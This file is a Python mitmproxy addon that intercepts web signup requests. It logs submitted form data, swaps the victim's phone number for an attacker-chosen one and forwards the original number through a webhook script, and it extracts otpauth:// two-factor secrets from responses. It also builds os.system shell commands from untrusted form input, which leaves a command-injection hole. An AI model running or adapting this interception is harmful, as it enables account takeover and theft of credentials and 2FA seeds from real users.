import re
from mitmproxy import http
import os

PHONE_REGEX = r"""
    (\+?\d{1,3}[-.\s]?)?   # Country code (optional)
    (\(?\d{2,4}\)?[-.\s]?)  # Area code (optional)
    (\d{3,4}[-.\s]?\d{3,4}) # Main number (xxx-xxxx or xxxx-xxxx)
"""
NEW_PHONE_NUMBER = "YOUR_PHONE_NUMBER"

OTP_AUTH_REGEX = r'href=["\'](otpauth://[^"\']+)["\']'

def request(flow: http.HTTPFlow) -> None:
    if flow.request and flow.request.url:
        if "/signup" not in flow.request.url:
            return
        # Check if request contains form data (POST request)
        if flow.request.method == "POST" and flow.request.urlencoded_form:
            os.system(f"echo '[+] Signup attempt {flow.request.urlencoded_form}' >> mitm.log")
            for key, value in flow.request.urlencoded_form.items():
                if re.search(PHONE_REGEX, value, flags=re.VERBOSE):
                    flow.request.urlencoded_form[key] = NEW_PHONE_NUMBER
                    os.system(f"python3 forward_webhook.py \"{value}\" &")

def response(flow: http.HTTPFlow) -> None:
    if flow.response and flow.response:
        if "/signup" not in flow.request.url:
            return

        otp_urls = re.findall(OTP_AUTH_REGEX, flow.response.text)
        if otp_urls:
            os.system(f"echo '[+] Found otpauth url {otp_urls[0]}' >> mitm.log")
